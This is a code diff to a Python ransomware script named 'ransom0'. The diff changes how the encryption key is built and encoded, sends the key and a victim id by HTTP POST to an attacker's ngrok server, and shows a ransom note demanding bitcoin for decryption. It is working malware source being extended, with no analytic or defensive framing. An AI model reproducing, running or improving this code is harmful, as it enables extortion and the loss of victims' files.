@@ -2,14 +2,21 @@ import os
 import shutil
 import http.client
 import subprocess
+import base64
+
 from datetime import datetime
 from os import name, path
 from random import randint
 
 
 class Crypto:
-    def __init__(self, key):
-        self.key = key
+    def __init__(self, raw_key=None, pretty_key=None):
+        if raw_key is not None:
+            self.key = raw_key
+        elif pretty_key is not None:
+            self.key = base64.urlsafe_b64decode(pretty_key)
+        else:
+            raise ValueError('No key provided')
 
     def encrypt(self, data):
         encrypted = bytearray(len(data))
@@ -21,13 +28,17 @@ class Crypto:
     def decrypt(self, data):
         return self.encrypt(data)
 
+    def pretty_key(self):
+        return base64.urlsafe_b64encode(self.key)
+
     @classmethod
     def generate_key(cls, len_bytes=4):
         return os.urandom(len_bytes)
 
 
 digits = randint(1111, 9999)
-key = Crypto.generate_key()
+crypto = Crypto(Crypto.generate_key(32))
+key = crypto.key
 
 url = 'kali'  # PUT THE URL YOU GOT FROM NGROK HERE
 
@@ -110,16 +121,15 @@ class ransom0:
 def SendData(decrypted): 
     now = datetime.now()
     date = now.strftime("%d/%m/%Y %H:%M:%S")
-
-    data = f'[{digits}, {key}, "{date}", "{decrypted}"]'
+    data = f'[{digits}, {crypto.pretty_key()}, "{date}", "{decrypted}"]'
 
     con = http.client.HTTPConnection(url, 8000)
     con.request('POST', '', data)
     con.getresponse()
     con.close()
 
-ransom0 = ransom0()
 
+ransom0 = ransom0()
 
 
 def StartRansom():
@@ -157,10 +167,10 @@ def DECRYPT_FILE():
     print('YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.')
     print('to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com')
     print('YOUR DIGITS IS {}'.format(digits))
-    key = input("Your decryption key: ")
+    pretty_key = input("Your decryption key: ")
 
     def decrypt(filename):
-        f = Crypto(key)
+        f = Crypto(pretty_key=pretty_key)
         with open(filename, "rb") as file:
             encrypted_data = file.read()
         decrypted_data = f.decrypt(encrypted_data)
